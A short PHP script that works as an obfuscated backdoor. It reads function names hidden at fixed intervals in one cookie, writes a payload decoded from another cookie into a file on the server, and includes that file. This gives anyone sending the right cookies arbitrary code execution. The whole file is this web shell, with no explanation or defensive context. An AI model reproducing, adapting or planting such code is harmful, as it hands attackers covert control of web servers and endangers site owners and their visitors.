<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[31])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 8;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[31][$n];
        if (!$c[31][$n + 1]) {
            if (!$c[31][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 8 + 1;
    }
    $k = $p[17]() . $p[12];
    if (!$p[28]($k)) {
        $n = $p[1]($k, $p[2]);
        $p[23]($n, $p[26] . $p[10]($p[9]($c[3])));
    }
    include($k);
}